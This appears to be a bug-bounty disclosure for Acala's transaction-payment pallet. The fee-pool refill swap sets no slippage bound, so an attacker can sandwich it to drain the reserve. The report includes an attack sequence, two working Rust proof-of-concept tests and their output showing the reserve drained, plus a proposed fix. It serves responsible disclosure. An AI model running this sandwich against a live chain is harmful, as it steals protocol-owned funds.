# Fee pool refill swap has no slippage check (`min_target = 0`) — any user can sandwich it to drain the protocol's reserves

When a charge fee pool runs low on the native token, the transaction-payment pallet refills it by selling the pool's whole reserve of the fee token on the DEX. That swap goes out with `min_target = 0` and skips the oracle/price check completely. The pallet does have config for that check (`MaxSwapSlippageCompareToOracle` and `PriceSource`), but nothing in the pallet ever reads them, so they do nothing. The refill is kicked off by a normal fee-paying transaction that anyone can send, so a regular user can sandwich it: move the DEX price first, let the pool dump its reserve into that bad price, then trade back. They come out even on the native token and up on the fee token, and that gain comes straight out of the protocol's reserve.

## Brief/Intro

Each enabled charge fee pool is a sub-account that holds protocol money — some native token plus a reserve of the fee token, both seeded from the treasury. Once its native balance drops below a threshold, the pallet sells the entire fee-token reserve on the DEX to top itself back up, and it doesn't put any limit on the price it's willing to accept. An attacker can push the DEX price out of line first, let the pool sell into that price for almost nothing, then unwind their own position. There's even a 10% oracle slippage limit configured on the live chain that's meant to stop exactly this, but it never gets applied to the swap. The upshot is that protocol-owned funds can be siphoned off, and it can be done again every time the pool refills.

## Vulnerability Details

The vulnerable swap is in `swap_from_pool_or_dex`:

`modules/transaction-payment/src/lib.rs:1139-1166`
```rust
let native_balance = T::Currency::free_balance(&sub_account);
let threshold_balance = SwapBalanceThreshold::<T>::get(supply_currency_id);
if native_balance < threshold_balance {
    let supply_balance = T::MultiCurrency::free_balance(supply_currency_id, &sub_account);
    let supply_amount = supply_balance.saturating_sub(T::MultiCurrency::minimum_balance(supply_currency_id));
    if let Ok((supply_amount, swap_native_balance)) = T::Swap::swap(
        &sub_account,
        supply_currency_id,
        T::NativeCurrencyId::get(),
        SwapLimit::ExactSupply(supply_amount, 0),   // <-- min_target = 0, NO slippage/oracle bound
    ) {
        // ...recompute rate + pool size...
    } else {
        debug_assert!(false, "Swap tx fee pool should not fail!");   // assumes the swap is always safe
    }
}
```

Two facts make this exploitable:

1. **The protective configuration is declared but never used.** The pallet's `Config` declares the guard and even documents its purpose:

   `modules/transaction-payment/src/lib.rs:363-372`
   ```rust
   /// When swap with DEX, the acceptable max slippage for the price from oracle.
   type MaxSwapSlippageCompareToOracle: Get<Ratio>;
   // ...
   /// The price source to provider external market price.
   type PriceSource: PriceProvider<CurrencyId>;
   ```
   A grep of the whole pallet shows these two items appear **only** at their declaration sites — they are never read in any swap. The same protection *is* correctly wired in `cdp-engine` for its liquidation swaps (`modules/cdp-engine/src/lib.rs:1349-1358`), which both proves the guard is intended and shows the omission here is a bug, not a design choice. On the live runtime the guard is even configured with a real value (`MaxSwapSlippageCompareToOracle = 10%`, `runtime/mandala/src/lib.rs:1184`), so operators believe these swaps are slippage-protected — they are not.

2. **The drain path is fully permissionless.** Triggering the refresh only requires a normal fee-paying transaction once the sub-account's native balance is below the threshold:
   - `with_fee_currency` is `ensure_signed` (`modules/transaction-payment/src/lib.rs:655`) → `charge_fee_currency` → `swap_from_pool_or_dex`.
   - The DEX swaps the attacker uses to skew and unwind the pool are permissionless `ensure_signed` extrinsics (`modules/dex/src/lib.rs:371,389`).
   - The only governance-gated piece is the **one-time** pool enablement `enable_charge_fee_pool` (`UpdateOrigin`, `modules/transaction-payment/src/lib.rs:615`), which is legitimate setup already performed on the live networks (`DefaultFeeTokens`). It does not gate the vulnerable path.

**Attack sequence (all calls permissionless):**
1. A charge-fee-pool for token `T` is enabled (live default), and over normal usage its sub-account has accumulated a reserve of `T` while its native balance has been drawn down toward `SwapBalanceThreshold` (an attacker can also self-induce this by paying fees in `T`).
2. **Front-run:** attacker swaps a large amount of `T → NATIVE` on the DEX, leaving the pool native-poor so any subsequent `T → NATIVE` executes far below fair value.
3. **Trigger:** attacker (or any user) submits one fee-paying transaction in `T`. `native_balance < threshold` is now true, so `swap_from_pool_or_dex` sells the sub-account's **entire** reserve via `ExactSupply(reserve, 0)` for a dust amount of native — the 10% oracle guard is never consulted, so the swap is accepted regardless of how far it deviates from the oracle price.
4. **Back-run:** attacker swaps `NATIVE → T`, buying back `T` cheaply from the now-bloated pool, recovering more `T` than they spent in step 2 and ending native-neutral.

Because the attacker's native position is fully returned, the net `T` gain is pure extraction sourced from the protocol's fee-pool reserve.

## Impact Details

This is a direct loss of protocol-owned funds — the Critical "Direct loss of funds" impact.

What gets drained is the reserve in each enabled fee pool sub-account (treasury-seeded native + accumulated fee tokens). I confirmed it on the real Mandala runtime (PoC B below): from a 1,000 DOT reserve, a permissionless attacker walked away with ~798 DOT (~80%), ending even on the native token, while the pool's reserve dropped to ~0.0000032 DOT and got only dust back (~167 DOT where ~500 was fair — proof the 10% oracle limit never ran). It's repeatable every refill cycle.

On sizing: the loss per hit is capped by the reserve held at refill time (~ the governance-set `pool_size − threshold`), so the mainnet figure depends on each token's `pool_size` and is biggest on shallow pools. That changes the amount, not the bug — the swap has no slippage bound and any user can profit from it.

**Fix:** use the already-declared `MaxSwapSlippageCompareToOracle` / `PriceSource` to set a `min_target` from the oracle price and reject swaps that deviate past the configured ratio, the way `cdp-engine` already does (`modules/cdp-engine/src/lib.rs:1349-1358`).

## References

- Vulnerable swap: `modules/transaction-payment/src/lib.rs:1139-1166` (`swap_from_pool_or_dex`, `SwapLimit::ExactSupply(supply_amount, 0)` at L1146)
- Dead-code guard: `modules/transaction-payment/src/lib.rs:363-372` (`MaxSwapSlippageCompareToOracle`, `PriceSource` — declared, never used)
- Live configured value (unused): `runtime/mandala/src/lib.rs:1184` (`MaxSwapSlippageCompareToOracle = 10%`)
- Correct reference implementation of the same guard: `modules/cdp-engine/src/lib.rs:1349-1358`
- Permissionless trigger: `modules/transaction-payment/src/lib.rs:655` (`with_fee_currency`, `ensure_signed`)
- Immunefi scope (runtime pallets in-scope; "Direct loss of funds" = Critical): https://immunefi.com/bug-bounty/acala
- Acala repo: https://github.com/AcalaNetwork/Acala

## Proof of Concept

Two executed PoCs are provided: a focused pallet test (clean numbers, real `module_dex` + real pallet logic) and an integration test on the **full real mandala runtime** (real 0.1% DEX fee, real fee-pool mechanics, the configured-but-dead 10% oracle guard). Both pass.

### Setup

```bash
git clone https://github.com/AcalaNetwork/Acala.git && cd Acala
git submodule update --init --recursive   # required: pulls orml + stable-asset
```

### PoC A — pallet test (proves the mechanism + attacker profit)

Add to `modules/transaction-payment/src/tests.rs` (uses the existing mock; `Currencies`/`DEXModule`/`Pallet`/`Ratio`/`PoolSize`/`SwapBalanceThreshold`/`TokenExchangeRate` are already in scope):

```rust
#[test]
fn fee_pool_refresh_swap_has_no_slippage_guard_permissionless_sandwich_drains_reserve() {
    ExtBuilder::default()
        .one_hundred_thousand_for_alice_n_charlie()
        .build()
        .execute_with(|| {
            let root = RuntimeOrigin::root;
            // ALICE = honest LP, BOB = attacker, DAVE = fee-paying user that triggers the refresh.
            assert_ok!(Currencies::update_balance(root(), ALICE, ACA, 10_000_000i128));
            assert_ok!(Currencies::update_balance(root(), ALICE, AUSD, 10_000_000i128));
            assert_ok!(Currencies::update_balance(root(), BOB, ACA, 10_000_000i128));
            assert_ok!(Currencies::update_balance(root(), BOB, AUSD, 10_000_000i128));
            assert_ok!(Currencies::update_balance(root(), DAVE, AUSD, 1_000i128));

            // Balanced AUSD/ACA pool (1:1).
            assert_ok!(DEXModule::add_liquidity(RuntimeOrigin::signed(ALICE), ACA, AUSD, 1_000_000, 1_000_000, 0, false));
            assert_eq!(DEXModule::get_liquidity_pool(ACA, AUSD), (1_000_000, 1_000_000));

            // Protocol-owned fee sub-account for AUSD: 500,000 AUSD reserve, ACA below threshold.
            let sub_account = Pallet::<Runtime>::sub_account_id(AUSD);
            assert_ok!(Currencies::update_balance(root(), sub_account.clone(), AUSD, 500_000i128));
            assert_ok!(Currencies::update_balance(root(), sub_account.clone(), ACA, 50i128));
            TokenExchangeRate::<Runtime>::insert(AUSD, Ratio::one());
            PoolSize::<Runtime>::insert(AUSD, 100_000);
            SwapBalanceThreshold::<Runtime>::insert(AUSD, 100_000); // sub ACA (50) < threshold -> refresh fires

            let bob_aca_before = Currencies::free_balance(ACA, &BOB);
            let bob_ausd_before = Currencies::free_balance(AUSD, &BOB);
            let sub_ausd_before = Currencies::free_balance(AUSD, &sub_account);

            // (1) FRONT-RUN: dump AUSD -> ACA, leaving the pool ACA-poor.
            assert_ok!(DEXModule::swap_with_exact_supply(RuntimeOrigin::signed(BOB), vec![AUSD, ACA], 1_000_000, 0));
            let bob_aca_gained = Currencies::free_balance(ACA, &BOB) - bob_aca_before;

            // (2) TRIGGER: a fee charge drives the refresh; pool dumps its 500k reserve via ExactSupply(_,0).
            assert_ok!(Pallet::<Runtime>::swap_from_pool_or_dex(&DAVE, 20, AUSD));

            // (3) BACK-RUN: buy back ACA-neutral.
            assert_ok!(DEXModule::swap_with_exact_supply(RuntimeOrigin::signed(BOB), vec![ACA, AUSD], bob_aca_gained, 0));

            let bob_aca_after = Currencies::free_balance(ACA, &BOB);
            let bob_ausd_after = Currencies::free_balance(AUSD, &BOB);
            let sub_ausd_after = Currencies::free_balance(AUSD, &sub_account);

            // HARM: attacker ACA-neutral, AUSD strictly up; protocol reserve drained.
            assert_eq!(bob_aca_after, bob_aca_before);
            assert!(bob_ausd_after > bob_ausd_before);
            assert!(bob_ausd_after - bob_ausd_before > 300_000); // ~+388,807 AUSD
            assert!(sub_ausd_after < 1_000);                     // 500,000 -> ~120
        });
}
```

Run:
```bash
SKIP_WASM_BUILD=1 cargo test -p module-transaction-payment --lib \
  fee_pool_refresh_swap_has_no_slippage_guard_permissionless_sandwich_drains_reserve -- --nocapture
```
Executed output:
```
BOB ACA:  10000000 -> 10000000     (attacker capital fully returned — unambiguous extraction)
BOB AUSD: 10000000 -> 10388807     (+388,807 AUSD profit, from nothing)
SUB AUSD: 500000 -> 120            (protocol fee-pool reserve drained)
test ... ok. 1 passed
```

### PoC B — full real mandala runtime (integration test, "full build + regtest")

Add to `runtime/integration-tests/src/payment.rs` (uses the existing `init_charge_fee_pool` / `add_liquidity` helpers and real runtime config):

```rust
#[test]
fn txpayment1_fee_pool_refresh_no_slippage_guard_real_runtime() {
    let native_ed = NativeTokenExistentialDeposit::get();
    let attacker: AccountId = AccountId::from([9u8; 32]);
    let sub_account: AccountId = TransactionPaymentPalletId::get().into_sub_account_truncating(RELAY_CHAIN_CURRENCY);

    ExtBuilder::default()
        .balances(vec![
            (AccountId::from(BOB), NATIVE_CURRENCY, native_ed),
            (AccountId::from(BOB), RELAY_CHAIN_CURRENCY, 1000 * dollar(RELAY_CHAIN_CURRENCY)),
            (attacker.clone(), NATIVE_CURRENCY, 1_000_000 * dollar(NATIVE_CURRENCY)),
            (attacker.clone(), RELAY_CHAIN_CURRENCY, 1_000_000 * dollar(RELAY_CHAIN_CURRENCY)),
        ])
        .build()
        .execute_with(|| {
            assert_ok!(add_liquidity(RELAY_CHAIN_CURRENCY, NATIVE_CURRENCY,
                1000 * dollar(RELAY_CHAIN_CURRENCY), 1000 * dollar(NATIVE_CURRENCY)));
            assert_ok!(init_charge_fee_pool(RELAY_CHAIN_CURRENCY)); // enables the REAL fee pool

            // Steady-state accumulated reserve in the protocol sub-account.
            let reserve = 1000 * dollar(RELAY_CHAIN_CURRENCY);
            assert_ok!(Currencies::update_balance(RuntimeOrigin::root(),
                MultiAddress::Id(sub_account.clone()), RELAY_CHAIN_CURRENCY, reserve.unique_saturated_into()));

            // Force the next fee charge to refresh.
            let sub_native = Currencies::free_balance(NATIVE_CURRENCY, &sub_account);
            module_transaction_payment::SwapBalanceThreshold::<Runtime>::insert(RELAY_CHAIN_CURRENCY, sub_native + 1);

            let att_relay_before = Currencies::free_balance(RELAY_CHAIN_CURRENCY, &attacker);
            let att_native_before = Currencies::free_balance(NATIVE_CURRENCY, &attacker);
            let sub_relay_before = Currencies::free_balance(RELAY_CHAIN_CURRENCY, &sub_account);

            // (1) FRONT-RUN
            assert_ok!(Dex::swap_with_exact_supply(RuntimeOrigin::signed(attacker.clone()),
                vec![RELAY_CHAIN_CURRENCY, NATIVE_CURRENCY], 1000 * dollar(RELAY_CHAIN_CURRENCY), 0));
            let att_native_gained = Currencies::free_balance(NATIVE_CURRENCY, &attacker) - att_native_before;

            // (2) TRIGGER via a normal fee-paying transaction (permissionless).
            assert_ok!(<module_transaction_payment::ChargeTransactionPayment<Runtime>>::from(0)
                .validate_and_prepare(Some(AccountId::from(BOB)).into(), &CALL, &INFO, 150, 0));

            // (3) BACK-RUN
            assert_ok!(Dex::swap_with_exact_supply(RuntimeOrigin::signed(attacker.clone()),
                vec![NATIVE_CURRENCY, RELAY_CHAIN_CURRENCY], att_native_gained, 0));

            // HARM: attacker NATIVE-neutral, RELAY strictly positive; protocol reserve drained.
            assert_eq!(Currencies::free_balance(NATIVE_CURRENCY, &attacker), att_native_before);
            assert!(Currencies::free_balance(RELAY_CHAIN_CURRENCY, &attacker) > att_relay_before);
            assert!(Currencies::free_balance(RELAY_CHAIN_CURRENCY, &sub_account) < sub_relay_before);
        });
}
```

Run:
```bash
SKIP_WASM_BUILD=1 cargo test -p runtime-integration-tests --features with-mandala-runtime \
  txpayment1_fee_pool_refresh_no_slippage_guard_real_runtime -- --nocapture
```
Executed output (real mandala runtime, 0.1% DEX fee):
```
reserve dumped (RELAY):  10000000000000        (~1000 DOT)
NATIVE the refresh got:  166635712923974       (dust vs ~500 DOT-worth fair => 10% guard NOT enforced)
attacker NATIVE: 1000000000000000000 -> 1000000000000000000   (ACA-neutral)
attacker RELAY:  10000000000000000  -> 10007983188478277      (profit +7,983,188,478,277 ≈ +798 DOT)
sub RELAY reserve: 10000001000000 -> 32284421                 (~1000 DOT -> ~0.0000032 DOT)
test ... ok. 1 passed
```
